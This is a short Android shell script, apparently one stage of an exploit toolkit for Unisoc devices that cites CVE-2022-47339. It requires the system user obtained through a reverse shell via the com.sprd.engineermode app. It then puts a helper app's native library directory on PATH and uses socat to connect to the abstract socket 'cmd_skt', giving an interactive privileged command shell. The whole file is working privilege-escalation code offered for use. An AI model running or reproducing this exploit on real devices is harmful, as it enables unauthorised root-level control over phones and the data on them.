#!/system/bin/sh

if [ "$(whoami)" != "system" ]; then
    echo "This script must be run as the system user (UID 1000), run the reverse shell on the com.sprd.engineermode app before running this script."
    exit 1
fi

TMPDIR=/sdcard
cd /sdcard

# Try to glob the directory
found=""
SYS_TOOLS="/data/app/com.sammy.systools*/lib/arm* /data/app/*/com.sammy.systools*/lib/arm*"
for dir in $SYS_TOOLS; do
    if [ -d "$dir" ]; then
        export PATH="$dir:$PATH"
        found=1
        break
    fi
done

# Fallback if not found
if [ -z "$found" ]; then
  echo "Error: com.sammy.systools library path not found, install the app before running this script. If you didn't understand how the exploit works run one of the tutorial scripts or read the README.md/watch the video tutorials carefully."
  return 0
fi
echo "Welcome to the Unisoc-SU Shell (aka CVE-2022-47339 reborn in 2025)"
echo "Enter Commands"
socat - ABSTRACT-CONNECT:cmd_skt
echo "Unisoc-SU Shell provided by the Elite x Skorpion96"
